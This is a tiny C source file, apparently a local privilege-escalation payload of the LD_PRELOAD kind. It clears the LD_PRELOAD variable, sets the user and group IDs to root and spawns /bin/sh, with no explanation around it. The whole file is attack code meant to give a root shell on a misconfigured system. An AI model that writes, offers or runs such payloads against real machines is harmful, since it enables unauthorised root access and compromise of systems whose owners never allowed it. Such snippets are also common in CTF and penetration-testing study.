#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void main() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}